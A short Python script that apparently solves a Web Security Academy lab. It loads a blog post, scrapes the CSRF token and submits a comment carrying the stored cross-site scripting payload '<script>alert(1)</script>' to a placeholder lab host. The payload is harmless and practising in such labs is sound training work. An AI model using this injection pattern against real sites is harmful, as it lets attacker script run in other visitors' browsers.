import requests
from bs4 import BeautifulSoup
import re

target_url='https://YOUR_HOST.web-security-academy.net'
headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded"
}

path='/post?postId=8'
path_exploit='/post/comment'

session=requests.Session()
res_get_csrf=session.get(target_url+path,headers=headers)
res_bs4=BeautifulSoup(res_get_csrf.text,'html.parser')
csrf=res_bs4.find('input', {'name':'csrf'})['value']

res=session.post(target_url+path_exploit,headers=headers,data={
    'csrf':csrf,
    'postId':'8',
    'comment':'<script>alert(1)</script>',
    'name':'test',
    'email':'test@gmail.com',
    'website':'https://google.com'
})
print(res.status_code)
